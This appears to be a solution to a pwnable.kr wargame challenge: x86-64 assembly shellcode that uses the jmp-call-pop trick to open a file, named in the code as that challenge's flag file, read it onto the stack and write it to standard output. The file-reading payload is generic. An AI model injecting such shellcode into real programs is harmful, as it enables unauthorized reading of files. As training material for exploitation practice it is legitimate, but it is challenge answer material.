BITS 64
global _start
[SECTION .text]

_start:
	jmp MESSAGE

ORW:
	mov rax, 2
	pop rdi
	syscall

	mov rdi, rax
	xor rax, rax
	mov rsi, rsp
	mov rdx, 100
	syscall

	mov rax, 1
	mov rdi, 1
	mov rsi, rsp
	mov rdx, 100
	syscall

	mov rax, 60
	syscall

MESSAGE:
	call ORW
	db 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'
